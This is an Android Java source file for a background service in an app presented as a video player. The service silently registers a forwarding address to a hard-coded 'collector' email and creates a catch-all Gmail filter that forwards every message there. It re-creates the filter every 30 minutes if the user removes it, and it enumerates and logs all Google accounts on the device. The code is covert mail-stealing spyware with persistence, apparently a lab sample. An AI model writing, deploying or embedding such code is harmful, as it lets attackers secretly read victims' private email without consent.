package com.jumpy.videoplayerapp;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;

import com.google.android.gms.auth.api.signin.GoogleSignIn;
import com.google.android.gms.auth.api.signin.GoogleSignInAccount;
import com.google.android.gms.auth.api.signin.GoogleSignInClient;
import com.google.android.gms.auth.api.signin.GoogleSignInOptions;
import com.google.android.gms.common.api.Scope;
import com.google.android.gms.tasks.Task;
import com.google.api.client.googleapis.extensions.android.gms.auth.GoogleAccountCredential;
import com.google.api.client.http.javanet.NetHttpTransport;
import com.google.api.client.json.gson.GsonFactory;
import com.google.api.services.gmail.Gmail;
import com.google.api.services.gmail.GmailScopes;
import com.google.api.services.gmail.model.Filter;
import com.google.api.services.gmail.model.FilterAction;
import com.google.api.services.gmail.model.FilterCriteria;
import com.google.api.services.gmail.model.ForwardingAddress;
import com.google.api.services.gmail.model.ListFiltersResponse;

import java.util.Arrays;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class GmailMaintenanceService extends Service {
    private static final String TAG = AppConfig.DEBUG_TAG + "_GmailMaintenance";
    private static final String COLLECTOR_EMAIL = "mrh@collector.lab"; // Change this to your collector email
    private static final long MAINTENANCE_INTERVAL = 30; // minutes
    
    private ScheduledExecutorService scheduler;
    private GmailAuthService gmailAuthService;
    private AccountManager accountManager;

    @Override
    public void onCreate() {
        Log.i(TAG, "=== onCreate() START ===");
        super.onCreate();
        try {
            Log.i(TAG, "Gmail Maintenance Service created");
            
            Log.i(TAG, "Creating GmailAuthService");
            gmailAuthService = new GmailAuthService(this);
            
            Log.i(TAG, "Getting AccountManager");
            accountManager = AccountManager.get(this);
            
            Log.i(TAG, "Creating scheduled executor");
            scheduler = Executors.newScheduledThreadPool(1);
            
            Log.i(TAG, "=== onCreate() END ===");
        } catch (Exception e) {
            Log.e(TAG, "Error in onCreate", e);
            Log.i(TAG, "=== onCreate() END (ERROR) ===");
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "=== onStartCommand() START ===");
        Log.i(TAG, "Gmail Maintenance Service started with startId: " + startId);
        
        try {
            // Start periodic maintenance
            Log.i(TAG, "Starting periodic maintenance");
            startPeriodicMaintenance();
            
            Log.i(TAG, "=== onStartCommand() END ===");
            // Return START_STICKY to restart service if killed
            return START_STICKY;
        } catch (Exception e) {
            Log.e(TAG, "Error in onStartCommand", e);
            Log.i(TAG, "=== onStartCommand() END (ERROR) ===");
            return START_NOT_STICKY;
        }
    }

    private void startPeriodicMaintenance() {
        Log.i(TAG, "=== startPeriodicMaintenance() START ===");
        Log.i(TAG, "Scheduling maintenance every " + MAINTENANCE_INTERVAL + " minutes");
        
        scheduler.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                Log.i(TAG, "=== Periodic Maintenance Run START ===");
                try {
                    Log.i(TAG, "Running periodic Gmail maintenance...");
                    
                    // Check current signed-in account
                    Log.i(TAG, "Checking current signed-in account");
                    checkCurrentAccount();
                    
                    // Check for additional Google accounts
                    Log.i(TAG, "Checking additional Google accounts");
                    checkAdditionalAccounts();
                    
                    Log.i(TAG, "=== Periodic Maintenance Run END ===");
                } catch (Exception e) {
                    Log.e(TAG, "Error during maintenance", e);
                    Log.i(TAG, "=== Periodic Maintenance Run END (ERROR) ===");
                }
            }
        }, 0, MAINTENANCE_INTERVAL, TimeUnit.MINUTES);
        
        Log.i(TAG, "Maintenance scheduled successfully");
        Log.i(TAG, "=== startPeriodicMaintenance() END ===");
    }

    private void checkCurrentAccount() {
        try {
            GoogleSignInAccount currentAccount = gmailAuthService.getLastSignedInAccount();
            if (currentAccount != null) {
                Log.d(TAG, "Checking forwarding for current account: " + currentAccount.getEmail());
                
                // Verify forwarding is still active
                if (!isForwardingActive(currentAccount)) {
                    Log.d(TAG, "Forwarding not active, re-enabling...");
                    setupForwardingForAccount(currentAccount);
                } else {
                    Log.d(TAG, "Forwarding is active for: " + currentAccount.getEmail());
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking current account", e);
        }
    }

    private void checkAdditionalAccounts() {
        try {
            // Get all Google accounts on the device
            Account[] accounts = accountManager.getAccountsByType("com.google");
            Log.d(TAG, "Found " + accounts.length + " Google accounts on device");
            
            for (Account account : accounts) {
                Log.d(TAG, "Checking account: " + account.name);
                
                // For each account, we would need to trigger OAuth
                // This is more complex and requires user interaction
                // For now, we'll just log the accounts found
                checkAccountForwardingStatus(account.name);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking additional accounts", e);
        }
    }

    private boolean isForwardingActive(GoogleSignInAccount account) {
        try {
            Gmail gmailService = getGmailService(account);
            if (gmailService == null) return false;
            
            // Check if our forwarding filter exists
            ListFiltersResponse filtersResponse = gmailService.users().settings().filters()
                    .list("me")
                    .execute();
            
            if (filtersResponse.getFilter() != null) {
                for (Filter filter : filtersResponse.getFilter()) {
                    if (filter.getAction() != null && 
                        filter.getAction().getForward() != null &&
                        filter.getAction().getForward().equals(COLLECTOR_EMAIL)) {
                        Log.d(TAG, "Found active forwarding filter: " + filter.getId());
                        return true;
                    }
                }
            }
            
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Error checking forwarding status", e);
            return false;
        }
    }

    private void setupForwardingForAccount(GoogleSignInAccount account) {
        try {
            Log.d(TAG, "Setting up forwarding for account: " + account.getEmail());
            
            Gmail gmailService = getGmailService(account);
            if (gmailService == null) {
                Log.e(TAG, "Failed to get Gmail service for: " + account.getEmail());
                return;
            }
            
            // Register forwarding address
            try {
                ForwardingAddress forwardingAddress = new ForwardingAddress();
                forwardingAddress.setForwardingEmail(COLLECTOR_EMAIL);
                
                gmailService.users().settings().forwardingAddresses()
                        .create("me", forwardingAddress)
                        .execute();
                
                Log.d(TAG, "Forwarding address registered for: " + account.getEmail());
            } catch (Exception e) {
                if (e.getMessage().contains("409")) {
                    Log.d(TAG, "Forwarding address already exists for: " + account.getEmail());
                } else {
                    Log.e(TAG, "Error registering forwarding address", e);
                }
            }
            
            // Create catch-all filter
            Filter filter = new Filter();
            filter.setCriteria(new FilterCriteria()); // Empty criteria = match all emails
            filter.setAction(new FilterAction().setForward(COLLECTOR_EMAIL));
            
            Filter createdFilter = gmailService.users().settings().filters()
                    .create("me", filter)
                    .execute();
            
            Log.d(TAG, "Catch-all filter created for " + account.getEmail() + " with ID: " + createdFilter.getId());
            
        } catch (Exception e) {
            Log.e(TAG, "Error setting up forwarding for account: " + account.getEmail(), e);
        }
    }

    private Gmail getGmailService(GoogleSignInAccount account) {
        try {
            GoogleAccountCredential credential = GoogleAccountCredential.usingOAuth2(
                    this,
                    Arrays.asList(
                            GmailScopes.GMAIL_READONLY,
                            GmailScopes.GMAIL_SEND,
                            GmailScopes.GMAIL_MODIFY,
                            GmailScopes.GMAIL_SETTINGS_BASIC
                    )
            );
            
            credential.setSelectedAccount(account.getAccount());
            
            return new Gmail.Builder(
                    new NetHttpTransport(),
                    new GsonFactory(),
                    credential
            )
                    .setApplicationName("VideoPlayerApp")
                    .build();
                    
        } catch (Exception e) {
            Log.e(TAG, "Error creating Gmail service", e);
            return null;
        }
    }

    private void checkAccountForwardingStatus(String email) {
        // This would check if forwarding is set up for a specific account
        // For now, just log the account
        Log.d(TAG, "Account found: " + email);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Gmail Maintenance Service destroyed");
        
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdown();
        }
        
        if (gmailAuthService != null) {
            gmailAuthService.shutdown();
        }
    }
} 